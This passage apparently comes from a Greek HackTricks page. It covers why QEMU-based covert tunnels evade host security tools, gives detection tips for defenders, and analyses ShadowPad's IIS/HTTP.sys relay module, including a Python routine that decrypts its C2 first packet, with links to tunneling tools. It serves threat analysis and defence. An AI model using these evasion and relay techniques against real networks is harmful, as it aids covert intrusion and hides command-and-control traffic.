### Γιατί αυτό αποφεύγει τον εντοπισμό

• Μόνο δύο unsigned executables (`qemu-system-*.exe`) γράφουν στον δίσκο· δεν εγκαθίστανται drivers ή services.
• Τα security products στο host βλέπουν **benign loopback traffic** (το πραγματικό C2 τερματίζεται μέσα στο VM).
• Οι memory scanners δεν αναλύουν ποτέ τον χώρο διεργασιών του malicious process, επειδή βρίσκεται σε διαφορετικό OS.

### Συμβουλές για Defenders

• Δημιουργήστε alert για **μη αναμενόμενα QEMU/VirtualBox/KVM binaries** σε paths με δυνατότητα εγγραφής από τον χρήστη.
• Αποκλείστε outbound connections που προέρχονται από το `qemu-system*.exe`.
• Αναζητήστε σπάνια listening ports (2222, 10022, …) που κάνουν bind αμέσως μετά την εκκίνηση του QEMU.

## IIS/HTTP.sys relay nodes μέσω `HttpAddUrl` (ShadowPad)

Το IIS module του ShadowPad, που χρησιμοποιεί το Ink Dragon, μετατρέπει κάθε compromised perimeter web server σε **backdoor + relay** διπλού σκοπού, κάνοντας bind covert URL prefixes απευθείας στο επίπεδο του HTTP.sys:<sup>[[3]](#references)</sup>

* **Config defaults** – αν το JSON config του module παραλείπει τιμές, χρησιμοποιεί πιστευτά IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Με αυτόν τον τρόπο, το benign traffic απαντάται από το IIS με το σωστό branding.
* **Wildcard interception** – οι operators παρέχουν μια λίστα URL prefixes χωρισμένων με semicolon (wildcards στο host + path). Το module καλεί `HttpAddUrl` για κάθε καταχώριση, οπότε το HTTP.sys δρομολογεί τα matching requests στον malicious handler *πριν* το request φτάσει στα IIS modules.
* **Encrypted first packet** – τα πρώτα δύο bytes του request body περιέχουν το seed για ένα custom 32-bit PRNG. Κάθε επόμενο byte γίνεται XOR με το generated keystream πριν από το protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – το module διατηρεί δύο λίστες: “servers” (upstream nodes) και “clients” (downstream implants). Οι καταχωρίσεις αφαιρούνται αν δεν ληφθεί heartbeat μέσα σε περίπου 30 δευτερόλεπτα. Όταν και οι δύο λίστες δεν είναι κενές, συνδέει τον πρώτο healthy server με τον πρώτο healthy client και απλώς προωθεί bytes μεταξύ των sockets τους μέχρι να κλείσει η μία πλευρά.
* **Debug telemetry** – το προαιρετικό logging καταγράφει τη source IP, τη destination IP και το συνολικό πλήθος forwarded bytes για κάθε pairing. Οι investigators χρησιμοποίησαν αυτά τα breadcrumbs για να ανακατασκευάσουν το ShadowPad mesh που εκτεινόταν σε πολλαπλά victims.

---

## Άλλα tools προς έλεγχο

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Κρυμμένοι στις σκιές: Covert Tunnels μέσω QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Πριν από το ToolShell: Διερεύνηση των προηγούμενων Ransomware Operations του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Μέσα στο Ink Dragon: Αποκάλυψη του Relay Network και του Inner Workings μιας Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
